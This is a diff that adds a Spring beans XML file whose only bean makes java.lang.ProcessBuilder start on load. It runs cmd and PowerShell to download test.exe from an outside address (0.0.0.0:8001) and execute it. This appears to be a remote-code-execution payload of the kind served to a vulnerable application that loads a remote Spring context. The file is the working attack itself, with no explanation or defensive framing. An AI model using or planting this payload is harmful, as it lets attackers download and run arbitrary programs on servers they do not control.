@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+    <beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg >
+            <list>
+                <value>cmd</value>
+                <value>/c</value>
+                <value>powershell Invoke-WebRequest "http://0.0.0.0:8001/test.exe" -OutFile "test.exe"; Start-Process "./test.exe"</value>
+            </list>
+            </constructor-arg>
+        </bean>
+    </beans>
